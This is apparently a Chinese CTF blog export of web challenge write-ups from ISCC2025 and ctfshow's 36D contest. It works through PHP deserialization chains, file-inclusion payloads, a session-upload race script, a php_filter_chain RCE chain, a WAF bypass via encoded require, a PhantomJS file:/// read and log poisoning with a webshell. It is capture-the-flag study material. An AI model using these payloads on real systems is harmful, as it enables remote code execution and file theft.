谁动了我的奶酪\n\n传入Tom拿到源码\n\n```php\n<?php\nini_set('display_errors', 0);\nerror_reporting(0);\n\necho \"<h2>据目击鼠鼠称，那Tom坏猫确实拿了一块儿奶酪，快去找找吧！</h2>\";\nerror_reporting(0);\n//include(\"clue.php\");\n$code = file_get_contents(__FILE__);\nhighlight_string($code);\n\nclass Tom{\n    public $stolenCheese;\n    public $trap;\n    public function __construct($file='cheesemap.php'){\n        $this->stolenCheese = $file;\n        echo \"Tom盯着你，想要守住他抢走的奶酪！\".\"<br>\";\n    }\n    public function revealCheeseLocation(){\n        if($this->stolenCheese){\n            $cheeseGuardKey = \"cheesemap.php\";\n            echo nl2br(htmlspecialchars(file_get_contents($this->stolenCheese)));\n            $this->stolenCheese = str_rot3($cheeseGuardKey);\n        }\n    }\n    public function __toString(){\n        if (!isset($_SERVER['HTTP_USER_AGENT']) || $_SERVER['HTTP_USER_AGENT'] !== \"JerryBrowser\") {\n            echo \"<h3>Tom 盯着你的浏览器，觉得它不太对劲……</h3>\";\n        }else{\n            $this->trap['trap']->stolenCheese;\n            return \"Tom\";\n        }\n    }\n\n    public function stoleCheese(){\n        $Messages = [\n            \"<h3>Tom偷偷看了你一眼，然后继续啃奶酪...</h3>\",\n            \"<h3>墙角的奶酪碎屑消失了，它们去了哪里？</h3>\",\n            \"<h3>Cheese的香味越来越浓，谁在偷吃？</h3>\",\n            \"<h3>Jerry皱了皱眉，似乎察觉到了什么异常……</h3>\",\n        ];\n        echo $Messages[array_rand($Messages)];\n        $this->revealCheeseLocation();\n    }\n}\n\nclass Jerry{\n    protected $secretHidingSpot;\n    public $squeak;\n    public $shout;\n    public function searchForCheese($mouseHole){\n        include($mouseHole);\n    }\n    public function __invoke(){\n        $this->searchForCheese($this->secretHidingSpot);\n    }\n}\n\nclass Cheese{\n    public $flavors;\n    public $color;\n    public function __construct(){\n        $this->flavors = array();\n    }\n    public function __get($slice){\n        $melt = $this->flavors;\n        return $melt();\n    }\n    public function __destruct(){\n        unserialize($this->color)();\n        echo \"Where is my cheese?\";\n    }\n}\n\nif (isset($_GET['cheese_tracker'])) {\n    unserialize($_GET['cheese_tracker']);\n}elseif(isset($_GET[\"clue\"])){\n    $clue = $_GET[\"clue\"];\n    $clue = str_replace([\"T\", \"h\", \"i\", \"f\", \"！\"], \"*\", $clue);\n    if (unserialize($clue)){\n        unserialize($clue)->squeak = \"Thief!\";\n        if(unserialize($clue)->shout === unserialize($clue)->squeak)\n            echo \"cheese is hidden in \".$where;\n        else\n            echo \"OHhhh no!find it yourself!\";\n    }\n}\n\n?>\n```\n\n一个很简单的反序列化直接打\n\n触发链子\n\n```\nCheese::__destruct()->Tom::__toString()->Cheese::__get()->Jerry::__invoke()->Jerry::searchForCheese()\n```\n\n然后写exp\n\n```php\n<?php\nclass Tom{\n    public $stolenCheese;\n    public $trap;\n}\n\nclass Jerry{\n    public $secretHidingSpot;\n    public $squeak;\n    public $shout;\n}\n\nclass Cheese{\n    public $flavors;\n    public $color;\n}\n\n$a = new Cheese();\n$a->color = new Tom();\n$a->color->trap = [\"trap\"=>new Cheese()];\n//$a->color->trap[\"trap\"]->flavors = \"phpinfo\";\n$a->color->trap[\"trap\"]->flavors =new Jerry();\n$a->color->trap[\"trap\"]->flavors->secretHidingSpot=\"php://filter/convert.base64-encode/resource=clue.php\";\n//$a->color->trap[\"trap\"]->flavors->secretHidingSpot=\"php://filter/convert.base64-encode/resource=flag_of_cheese.php\";\necho urlencode(serialize($a));\n```\n\n因为会经过`__toString()`方法，所以需要伪造一下UA头\n\n传进去拿到base64编码\n\n![image-20250516090652202](../image/achieve/202411/sql注入--ctfshow/image-20250516090652202.png)\n\n跟着读拿到第一段flag，然后就没头绪了\n\n后来发现include可以打filter chain，列出目录后一样的去进行文件包含就行\n\n拿到文件名c3933845e2b7d466a9776a84288b8d86.php，读出来一段异或的结果，但是具体异或多少不知道，可以直接用厨子进行范围异或\n\n![image-20250516200320620](../image/achieve/202411/ISCC2025/image-20250516200320620.png)\n\n同样的既然我们可以列出目录，当然也可以尝试getshell进行RCE\n\n最后想骂一句，平台太烂了！\n\n![842a7d56ce893dffd98c20058dea6dba](../image/achieve/202411/ISCC2025/842a7d56ce893dffd98c20058dea6dba.jpg)\n","tags":["ISCC2025"],"categories":["赛题wp"]},{"title":"ctfshow36D练手赛+36D杯(已做完)","url":"/2025/05/15/ctfshow36D练手赛-36D杯(已做完)/","content":"\n# 36D练手赛\n\n## 不知所措.jpg\n\n需要GET传入file参数且file参数必须有test\n\n传入test.显示没有flag，不过可以确定是存在文件包含的，但是这里有test的阻碍的话该怎么正确读取文件呢？\n\n![image-20250419142016212](../image/achieve/202411/36D杯+练手赛/image-20250419142016212.png)\n\n官方手册中认证的参数只有这几个，所以传入的其他参数是不会被解析的\n\n```\n?file=php://filter/read=convert.base64-encode/test这里随便写/resource=flag.\n```\n\n我本来是试着去读flag的，但是没读出来\n\n试试index看看能不能读到源代码，然后也是成功读到了index.php文件的源码，我们拿去解码一下\n\n```php\n<?php\nerror_reporting(0);\n$file=$_GET['file'];\n$file=$file.'php';\necho $file.\"<br />\";\nif(preg_match('/test/is',$file)){\n\tinclude ($file);\n}else{\n\techo '$file must has test';\n}\n?>\n```\n\n这里可以看到是include包含，而且是有限制的文件包含，但是不影响我们用data伪协议\n\n构造payload:\n\n```\n?file=data://text/plain,<?php phpinfo();//test ?>\n```\n\n成功执行，然后直接打就行\n\n## easyshell\n\n源码中看到一个注释掉的\n\n```\n<!--md5($secret.$name)===$pass -->\n```\n\n抓包看到一个Hash值,估计就是md5的结果，也就是pass的值\n\n![image-20250619163220559](../image/achieve/202411/36D杯+练手赛/image-20250619163220559.png)\n\n然后我们试着传入name和pass试一下\n\n```\n?name=1&pass=f4d232dfb2c0d3f50350346fc68a1753\n```\n\n传入发现response包中的cookie变了，我们跟进一下\n\n看到了一个flflflflag.php，我们访问看看\n\n一开始以为是404，抓包发现是假的，看到了include包含file参数，应该是任意文件包含漏洞，我们用伪协议去读取一下文件\n\n```\n?file=php://filter/read=convert.base64-encode/resource=index.php\n```\n\n想试着读一下flag发现不得行，先读index吧\n\n```php\n//index.php\n<?php\ninclude 'config.php';\n@$name=$_GET['name'];\n@$pass=$_GET['pass'];\nif(md5($secret.$name)===$pass){\n\techo '<script language=\"javascript\" type=\"text/javascript\">\n           window.location.href=\"flflflflag.php\";\n\t</script>\n';\n}else{\n\tsetcookie(\"Hash\",md5($secret.$name),time()+3600000);#\n\techo \"username/password error\";\n}\n?>\n<html>\n<!--md5($secret.$name)===$pass -->\n</html>\n\n```\n\n```php\n//config.php\n<?php\n$secret='%^$&$#fffd';\n?>\n```\n\n```php\n//flflflflag.php\n<html>\n<head>\n<script language=\"javascript\" type=\"text/javascript\">\n           window.location.href=\"404.html\";\n</script>\n<title>yesec want Girl friend</title>\n</head>\n<>\n<body>\n<?php\n$file=$_GET['file'];\nif(preg_match('/data|input|zip/is',$file)){\n\tdie('nonono');\n}\n@include($file);\necho 'include($_GET[\"file\"])';\n?>\n</body>\n</html>\n\n```\n\n这道题的话入口应该是在include函数，但是我试着读flag的时候没读出来，说明应该不是这个名字，用日志注入也没打通，试一下url编码绕过input去rce但是也不行\n\n那就打session文件包含\n\n利用PHP_SESSION_UPLOAD_PROGRESS加条件竞争进行文件包含，直接上脚本\n\n```python\nimport io\nimport requests\nimport threading\n\nsessid=\"wanth3f1ag\"\nurl=\"http://896e6d4e-6df6-4228-8246-19e13efa2866.challenge.ctf.show/flflflflag.php\"\n\ndef write(session):\n    while event.is_set():\n        f=io.BytesIO(b'a'*1024*50)\n        r=session.post(\n            url=url,\n            cookies={'PHPSESSID':sessid},\n            data={\n                # \"PHP_SESSION_UPLOAD_PROGRESS\": \"<?php system('whoami');?>\"\n            },\n            files={\"file\":('1.txt',f)}\n        )\n\ndef read(session):\n    while event.is_set():\n        payload=\"?file=/tmp/sess_\"+sessid\n        r=session.get(url=url+payload)\n\n        if '1.txt' in r.text:\n            print(r.text)\n            event.clear()\n            break\n\n\nif __name__=='__main__':\n    event=threading.Event()\n    event.set()\n\n    with requests.session() as session:\n        for i in range(5):\n            threading.Thread(target=write,args=(session,)).start()\n        for i in range(5):\n            threading.Thread(target=read,args=(session,)).start()\n```\n\n然后访问我们的木马shell.php并用蚁剑连接\n\n![image-20241215003617627](./../image/achieve/202411/ctfshow--web专题/image-20241215003617627.png)\n\n但是是空的，开终端发现显示127\n\n![image-20241215003701886](./../image/achieve/202411/ctfshow--web专题/image-20241215003701886.png)\n\n应该是需要绕过disablefunction，直接用蚁剑里面的插件，但是后面发现cat不了那个文件\n\n![image-20241215004349936](./../image/achieve/202411/ctfshow--web专题/image-20241215004349936.png)\n\n然后我就利用shell.php去进行rce了\n\n![image-20241215004424281](./../image/achieve/202411/ctfshow--web专题/image-20241215004424281.png)\n\n直接对shell.php中的参数1传入phpinfo()，然后在里面找flag就可以了\n\n另外还可以用filter链打RCE，可以参考我另一篇文章https://wanth3f1ag.top/2025/05/19/filters-chain%E5%AE%9E%E7%8E%B0RCE/\n\n```bash\nroot@VM-16-12-ubuntu:/opt/php_filter_chain_RCE/php_filter_chain_generator# python3 php_filter_chain_generator.py --chain '<?php phpinfo();?>'\n[+] The following gadget chain will generate the following code : <?php phpinfo();?> (base64 value: PD9waHAgcGhwaW5mbygpOz8+)\nphp://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16|convert.iconv.WINDOWS-1258.UTF32LE|convert.iconv.ISIRI3342.ISO-IR-157|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSA_T500.UTF-32|convert.iconv.CP857.ISO-2022-JP-3|convert.iconv.ISO2022JP2.CP775|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM891.CSUNICODE|convert.iconv.ISO8859-14.ISO6937|convert.iconv.BIG-FIVE.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.CP1163.CSA_T500|convert.iconv.UCS-2.MSCP949|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSGB2312.UTF-32|convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp\n```\n\n将生成的内容传入file参数\n\n![image-20250619164207129](../image/achieve/202411/36D杯+练手赛/image-20250619164207129.png)\n\n成功执行，后面就可以直接读flag了\n\n到此练手赛就结束了，开始进入36D的内容\n\n# 36D杯\n\n## 给你shell\n\n![image-20241215004943533](./../image/achieve/202411/ctfshow--web专题/image-20241215004943533.png)\n\n准备了一个shell给我们，但是扫目录没发现什么内容\n\n源码注释\n\n```\n<!--flag is in /flag.txt-->\n```\n\n然后访问这个文件发现是空页面，我们抓个包看看\n\n![image-20241215005953930](./../image/achieve/202411/ctfshow--web专题/image-20241215005953930.png)\n\n有一个secret的cookie值，拿去解密后是y1ng，但是用蚁剑连接不成功，看来是方向搞错了\n\n后来在页面源码中找到了源代码\n\n```php\n<?php\n//It's no need to use scanner. Of course if you want, but u will find nothing.\nerror_reporting(0);\ninclude \"config.php\";\n\nif (isset($_GET['view_source'])) {\n    show_source(__FILE__);\n    die;\n}\n\nfunction checkCookie($s) {\n    $arr = explode(':', $s);\n    if ($arr[0] === '{\"secret\"' && preg_match('/^[\\\"0-9A-Z]*}$/', $arr[1]) && count($arr) === 2 ) {\n        return true;\n    } else {\n        if ( !theFirstTimeSetCookie() ) setcookie('secret', '', time()-1);\n        return false;\n    }\n}\n\nfunction haveFun($_f_g) {\n    $_g_r = 32;\n    $_m_u = md5($_f_g);\n    $_h_p = strtoupper($_m_u);\n    for ($i = 0; $i < $_g_r; $i++) {\n        $_i = substr($_h_p, $i, 1);\n        $_i = ord($_i);\n        print_r($_i & 0xC0);\n    }\n    die;\n}\n\nisset($_COOKIE['secret']) ? $json = $_COOKIE['secret'] : setcookie('secret', '{\"secret\":\"' . strtoupper(md5('y1ng')) . '\"}', time()+7200 );\ncheckCookie($json) ? $obj = @json_decode($json, true) : die('no');\n\nif ($obj && isset($_GET['give_me_shell'])) { \n    ($obj['secret'] != $flag_md5 ) ? haveFun($flag) : echo \"here is your webshell: $shell_path\";\n}\n\ndie;\n```\n\nIt's no need to use scanner. Of course if you want, but u will find nothing.好吧这句话已经在嘲笑我了，怪我没好好审页面源代码吧，那我们来分析一下代码和相关的函数\n\n### explode()函数\n\n`explode()` 函数是 PHP 中用于将字符串分割成数组的一个内置函数\n\n基础语法\n\n```\narray explode(string $delimiter, string $string[, int $limit = PHP_INT_MAX])\n```\n\n参数说明\n\n1. **$delimiter**:\n   - 字符串类型，指定用于分隔字符串的分隔符。当找到这个分隔符时，`explode()` 会在该位置将字符串切割开。\n2. **$string**:\n   - 字符串类型，要被切割的源字符串。\n3. **$limit** (可选):\n   - 整数类型，限制返回的数组元素的数量。如果设置为正数，返回的数组将包含最多 `$limit` 个元素；如果设置为负数，返回的数组将包含所有元素，但去掉最后 `$limit` 个元素。\n\n### strtoupper()函数\n\n`strtoupper()` 函数是 PHP 中用于将字符串中的所有字母转换为大写字母的一个内置函数。\n\n基础语法\n\n```\nstring strtoupper(string $string)\n```\n\n参数说明\n\n- $string\n  - 字符串类型，输入的要转换为大写的字符串。\n\n返回值\n\n- 函数返回转换后的字符串，其中的所有字母都被转换为大写。如果输入字符串中没有字母，或者字符串为空，则返回原字符串。\n\n### 位与运算\n\n位与运算 (`&`) 是对两个二进制数逐位比较，如果两个对应的位都是 1，则结果为 1；否则结果为 0。\n\n这里的话随便传入一个secret，就可用拿到flag位运算后的结果，记得这里还需要传入give_me_shell参数，不然就满足不了外层判断句的条件\n\n![image-20250515172421465](../image/achieve/202411/36D杯+练手赛/image-20250515172421465.png)\n\n得到flag位与运算后的结果是0006464640064064646464006406464064640064006400000000000\n\n首先我们要知道，在经过MD5函数后转大写，只有数字和大写字母\n\n然后我们看看位运算中的结果是什么样的\n\n```php\n<?php\nfor($a = 1; $a <= 127; $a++) {\n    $md = $a & 0xC0;\n    echo $a.\"的位运算结果是\".$md.\"\\n\";\n}\n```\n\n可以发现，在小于63的时候，运算结果都是0，在大于63小于127的时候运算结果都是64，从flag运算结果来看，前三位都是纯数字，那我们进行爆破\n\n注意:这里的话要把secret设置为纯数字，不然的话就会匹配类型\n\n![image-20241217221603876](./../image/achieve/202411/ctfshow--web专题/image-20241217221603876.png)\n\n这里的话我就是没去掉双引号导致并没有绕过这个弱比较，我设置纯数字之后才出来了结果\n\n![image-20241217221733638](./../image/achieve/202411/ctfshow--web专题/image-20241217221733638.png)\n\n可以看到文件名，我们访问一下\n\n```php\n<?php\nerror_reporting(0);\nsession_start();\n\n\n//there are some secret waf that you will never know, fuzz me if you can\nrequire \"hidden_filter.php\";\n\n\nif (!$_SESSION['login'])\n    die('<script>location.href=\\'./index.php\\'</script>');\n\n\nif (!isset($_GET['code'])) {\n    show_source(__FILE__);\n    exit();\n} else {\n    $code = $_GET['code'];\n    if (!preg_match($secret_waf, $code)) {\n        //清空session 从头再来\n        eval(\"\\$_SESSION[\" . $code . \"]=false;\"); //you know, here is your webshell, an eval() without any disabled_function. However, eval() for $_SESSION only XDDD you noob hacker\n    } else die('hacker');\n}\n```\n\n还是一个代码审计，我们简单分析一下，这里需要我们传入一个GET 的code参数和在会话中设置一个login，然后对code进行正则匹配，判断为真则将清空session中code的值，不然的话会输出hacker\n\n这里因为没有给出waf的代码，所以我们需要进行fuzz，而且题目也提示了fuzz，那我们用bp进行fuzz测试一下\n\n通过测试发现过滤了单双引号，括号，反引号，字符 f 以及一些常用函数，加上题目提示我们 flag在 /flag.txt中，那个就应该是要读取文件内容了\n\npayload:\n\n```\n?code=]=1?><?=require~%d0%99%93%9e%98%d1%8b%87%8b?>\n```\n\n![image-20241219084711378](./../image/achieve/202411/ctfshow--web专题/image-20241219084711378.png)\n\npayload：\n\n```\n?code=]=1?><?=require~%d0%99%93%9e%98?>\n```\n\n我们解析一下这两个payload，先说第一个，先说第一个\n\n```\n?code=]=1?><?=require~%d0%99%93%9e%98%d1%8b%87%8b?>\n```\n\n其中`？>`符号可以被当作`;`解析，而我们这里因为很多符号都被禁用了，我们的思路就是利用`eval(\"\\$_SESSION[\" . $code . \"]=false;\");`，而利用方法就是去闭合这里的`eval(\"$_SESSION[\"`去想办法读取flag，因为;在黑名单里但是<>?不在黑名单里，所以我们尝试构造?code=]?><?去进行bypass，然后我又发现我们的()都在黑名单里，所以能读取文件的函数也很少了，但是我发现题目中有`require \"hidden_filter.php\";`的代码，我就想到了用require去进行读取文件\n\n## RemoteImageDownloader\n\n可参考CVE-2019-17221[PhantomJS任意文件读取](https://web.archive.org/web/20191220171022/https://www.darkmatter.ae/blogs/breaching-the-perimeter-phantomjs-arbitrary-file-read/)\n\n![image-20241219092943000](./../image/achieve/202411/ctfshow--web专题/image-20241219092943000.png)\n\n这个的话是一个从远程加载图片进行下载的题目，这里的话我的思路就是用服务器创建html文件，然后通过download去访问我们的html文件，达到一个攻击的效果\n\n```html\n<html>\n \t<head>\n \t\t<body>\n\t\t\t <script>\n \t\t\tx=new XMLHttpRequest;\n \t\t\tx.onload=function(){\n \t\t\tdocument.write(this.responseText)\n \t\t\t};\n \t\t\tx.open(\"GET\",\"file:///flag\");\n \t\t\tx.send();\n \t\t\t</script>\n \t\t</body>\n \t</head>\n</html>\n```\n\n![image-20241219093238973](./../image/achieve/202411/ctfshow--web专题/image-20241219093238973.png)\n\n然后我们访问这个1.html，就会进行下载图片，图片中就会带出我们的flag\n\n我们来解释一下那个html文件中的script片段\n\n- `new XMLHttpRequest;` 创建一个新的 XMLHttpRequest 对象 `x`。这个对象用于在客户端与服务器之间进行异步请求。\n- `x.onload=function(){ document.write(this.responseText) };` 定义了当请求完成后要执行的函数。在这个函数中，`this.responseText` 包含了从服务器返回的响应内容。`document.write()` 方法会将该内容写入当前文档。\n- `x.open(\"GET\",\"file:///flag\");` 准备一个 HTTP GET 请求，目标是一个本地文件（`file:///flag`）。这是一个文件系统的路径，通常用于尝试从本地读取一个文件。\n- `x.send();` 发送请求。\n\n所以这里可以看到其实我们的flag是写入了这个下载的图片中的，也就是我们的响应内容中，假如没有执行file://flag的话，就会只有一个空图片\n\n![image-20241219093531467](./../image/achieve/202411/ctfshow--web专题/image-20241219093531467.png)\n\n而如果我们进行了正确的攻击后就会\n\n![image-20241219093559492](./../image/achieve/202411/ctfshow--web专题/image-20241219093559492.png)\n\n### PhantomJs 任意文件读取\n\nPhantomJS 使用内部模块 ：，打开、关闭、呈现和执行网页上的多个操作，该模块存在任意文件读取漏洞。该漏洞存在于模块的函数中，该函数加载指定的 URL 并调用给定的回调。打开 HTML 文件时，攻击者可以提供特制的文件内容，从而允许读取文件系统上的任意文件。该漏洞通过使用作为函数回调来演示，从而生成目标文件的 PDF 或图像。 `webpage` `page.open()` `webpage` `page.render()`\n\n```\nvar webPage = require ( '网页' ); \nvar page = webPage.create();\n```\n\n上述 JavaScript 代码初始化并创建一个页面对象，可用于执行进一步的操作，例如加载网页。\n\n在下面的代码片段中，该函数负责打开和解析提供的 URL，并使用该函数生成 PNG 图像。 `page.open()` `page.render()`\n\n此外， PhantomJS 还会在内部调用检查所提供 URL 中的方案。如果提供的方案为空，则将其设置为给定 URL 的默认方案。\n\n从下面显示的代码中可以看出这一点，这样做是为了访问本地存储的 HTML/CSS 文件。 `page.open()` `WebPage::openUrl()` `file://`\n\n```js\n文件：phantom/phantomjs/src/webpage.cpp \n954：//如果方案为空，则假定为本地文件 \n955：if (url.scheme().isEmpty()) { \n956：url.setPath(QFileInfo(url.toString()).absoluteFilePath().prepend( \"/\" )); \n957：url.setScheme( \"file\" ); \n958：}\n```\n\n因此，使用页面渲染代码片段将生成一个空白的 png 图像，因为它不会解析提供的 URL（该 URL 已设置为方案）。而使用带方案的将生成包含提供的 URL 内容的渲染图像。 `page.open('www.google.com')` `file://` `page.open('https://www.google.com')` `https://`\n\n所以这就是为什么我们攻击失败的时候也会返回一张图片但是图片是空的，再结合我们的exp可以想到这段payload的意思了，其实我们确实是访问了一张空图片，但是因为执行了我们的html文件，这个代码中会把flag写入我们的图片中\n\nPhantomJS 还使用一个开关，该开关需要一个布尔值，默认情况下设置为。该开关启用 PhantomJS 中的网络安全功能，并禁止触发跨域 XHR 请求。 `--web-security` `True`\n\n由于跨域 XHR 限制，本地存储的 HTML 文件不允许触发对任意外部实体的请求，并且由于实现原因，除非在标头中明确指定，否则也无法从跨域实体读取响应。 `XHR` `Same Origin Policy`\n\n当经过PhantomJS解析后，可以通过发出XHR请求来读取其中的内容。\n\n## ALL_INFO_U_WANT\n\n### #日志注入\n\n是一个玩魔方的游戏\n\n![image-20241219152554679](./../image/achieve/202411/ctfshow--web专题/image-20241219152554679.png)\n\n扫目录\n\n```\n[11:36:56] Scanning:\n[11:37:20] 200 -   441B - /index.php.bak\n[11:37:22] 301 -   169B - /media  ->  http://b87fcdf0-43c4-411b-9727-01cb51888a31.challenge.ctf.show/media/\n[11:37:22] 403 -   555B - /media/\n[11:37:28] 301 -   169B - /scripts  ->  http://b87fcdf0-43c4-411b-9727-01cb51888a31.challenge.ctf.show/scripts/\n[11:37:28] 403 -   555B - /scripts/\n[11:37:30] 301 -   169B - /styles  ->  http://b87fcdf0-43c4-411b-9727-01cb51888a31.challenge.ctf.show/styles/\n```\n\n发现一个200的/index.php.bak文件，进行访问下载\n\n```php\n\nvisit all_info_u_want.php and you will get all information you want\n\n= =Thinking that it may be difficult, i decided to show you the source code:\n\n\n<?php\nerror_reporting(0);\n\n//give you all information you want\nif (isset($_GET['all_info_i_want'])) {\n    phpinfo();\n}\n\nif (isset($_GET['file'])) {\n    $file = \"/var/www/html/\" . $_GET['file'];\n    //really baby include\n    include($file);\n}\n\n?>\n\n\n\nreally really really baby challenge right? \n```\n\n访问all_info_u_want.php，传入all_info_i_want参数就得到了当前php版本的配置信息了，\n\n```\n/all_info_u_want.php?all_info_i_want=1\n```\n\n![image-20250516115212042](../image/achieve/202411/36D杯+练手赛/image-20250516115212042.png)\n\n但是我们的利用点还是include($file)，不过这道题说实真的太仁慈了，这里直接利用日志注入就可以了\n\n这里可以看到是开启了日志记录的功能的，那我们尝试包含一下日志文件\n\n报错看服务器版本nginx/1.20.1\n\n那我们访问一下\n\n```\n?file=../../../var/log/nginx/access.log\n```\n\n目录穿越后就可以看到我们的日志文件了\n\n抓包，在UA头插入恶意命令或者一句话木马，然后就可以进行rce了\n\n发现一个假的flag，提示flag在etc文件，让我们自己去找，这里的话可以一个个找也可以直接在终端进行命令\n\n```\nfind /etc -name “*” | xargs grep “ctfshow{\n```\n\n正常来说这个命令就是用来找包含flag字符串的文件的，但是好像蚁剑里面得把`-name “*”`去掉，没搞明白原因\n\n我说怎么查不出来flag，原来flag是ctfshow开头的\n\n```\nfind /etc | xargs grep \"ctfshow{\"\n```\n\n![image-20250516120337230](../image/achieve/202411/36D杯+练手赛/image-20250516120337230.png)\n\n成功拿到flag\n\n## WUSTCTF\\_朴实无华_Revenge\n\n```php\n<?php\nheader('Content-type:text/html;charset=utf-8');\nerror_reporting(0);\nhighlight_file(__file__);\n\nfunction isPalindrome($str){\n    $len=strlen($str);\n    $l=1;\n    $k=intval($len/2)+1;\n    for($j=0;$j<$k;$j++)\n        if (substr($str,$j,1)!=substr($str,$len-$j-1,1)) {\n            $l=0;\n            break;\n        }\n    if ($l==1) return true;\n    else return false;\n}\n\n//level 1\nif (isset($_GET['num'])){\n    $num = $_GET['num'];\n    $numPositve = intval($num);\n    $numReverse = intval(strrev($num));\n    if (preg_match('/[^0-9.-]/', $num)) {\n        die(\"非洲欢迎你1\");\n    }\n    if ($numPositve <= -999999999999999999 || $numPositve >= 999999999999999999) { //在64位系统中 intval()的上限不是2147483647 省省吧\n        die(\"非洲欢迎你2\");\n    }\n    if( $numPositve === $numReverse && !isPalindrome($num) ){\n        echo \"我不经意间看了看我的劳力士, 不是想看时间, 只是想不经意间, 让你知道我过得比你好.</br>\";\n    }else{\n        die(\"金钱解决不了穷人的本质问题\");\n    }\n}else{\n    die(\"去非洲吧\");\n}\n\n//level 2\nif (isset($_GET['md5'])){\n    $md5=$_GET['md5'];\n    if ($md5==md5(md5($md5)))\n        echo \"想到这个CTFer拿到flag后, 感激涕零, 跑去东澜岸, 找一家餐厅, 把厨师轰出去, 自己炒两个拿手小菜, 倒一杯散装白酒, 致富有道, 别学小暴.</br>\";\n    else\n        die(\"我赶紧喊来我的酒肉朋友, 他打了个电话, 把他一家安排到了非洲\");\n}else{\n    die(\"去非洲吧\");\n}\n\n//get flag\nif (isset($_GET['get_flag'])){\n    $get_flag = $_GET['get_flag'];\n    if(!strstr($get_flag,\" \")){\n        $get_flag = str_ireplace(\"cat\", \"36dCTFShow\", $get_flag);\n        $get_flag = str_ireplace(\"more\", \"36dCTFShow\", $get_flag);\n        $get_flag = str_ireplace(\"tail\", \"36dCTFShow\", $get_flag);\n        $get_flag = str_ireplace(\"less\", \"36dCTFShow\", $get_flag);\n        $get_flag = str_ireplace(\"head\", \"36dCTFShow\", $get_flag);\n        $get_flag = str_ireplace(\"tac\", \"36dCTFShow\", $get_flag);\n        $get_flag = str_ireplace(\"$\", \"36dCTFShow\", $get_flag);\n        $get_flag = str_ireplace(\"sort\", \"36dCTFShow\", $get_flag);\n        $get_flag = str_ireplace(\"curl\", \"36dCTFShow\", $get_flag);\n        $get_flag = str_ireplace(\"nc\", \"36dCTFShow\", $get_flag);\n        $get_flag = str_ireplace(\"bash\", \"36dCTFShow\", $get_flag);\n        $get_flag = str_ireplace(\"php\", \"36dCTFShow\", $get_flag);\n        echo \"想到这里, 我充实而欣慰, 有钱人的快乐往往就是这么的朴实无华, 且枯燥.</br>\";\n        system($get_flag);\n    }else{\n        die(\"快到非洲了\");\n    }\n}else{\n    die(\"去非洲吧\");\n}\n?>\n去非洲吧\n```\n\n先看level 1\n\n### level 1\n\n```php\nif (isset($_GET['num'])){\n    $num = $_GET['num'];\n    $numPositve = intval($num);\n    $numReverse = intval(strrev($num));\n    if (preg_match('/[^0-9.-]/', $num)) {\n        die(\"非洲欢迎你1\");\n    }\n    if ($numPositve <= -999999999999999999 || 